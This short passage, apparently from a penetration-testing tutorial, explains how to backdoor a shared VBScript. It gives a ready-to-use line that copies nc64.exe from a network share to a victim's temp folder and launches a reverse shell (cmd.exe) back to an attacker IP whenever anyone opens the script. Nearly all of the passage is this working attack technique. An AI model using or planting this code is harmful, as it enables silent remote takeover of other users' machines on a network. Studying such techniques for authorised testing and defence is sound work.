Backdooring .vbs Scripts

As an example, if the shared resource is a VBS script, we can put a copy of nc64.exe on the same share and inject the following code in the shared script:

CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y [\\\10.10.28.6\myshare\nc64.exe](file://10.10.28.6/myshare/nc64.exe) %tmp% & %tmp%\nc64.exe -e cmd.exe \<attacker_ip\> 1234", 0, True

This will copy nc64.exe from the share to the user's workstation %tmp% directory and send a reverse shell back to the attacker whenever a user opens the shared VBS script.
